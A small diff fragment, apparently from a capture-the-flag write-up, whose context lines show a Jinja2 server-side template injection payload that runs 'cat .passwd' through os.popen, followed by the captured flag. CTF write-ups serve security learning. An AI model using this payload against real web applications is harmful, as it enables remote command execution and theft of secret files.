@@ -211,3 +211,4 @@ Ref: [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Serv
 Payload: ``{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat .passwd').read() }}``
 
 flag: Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!
+
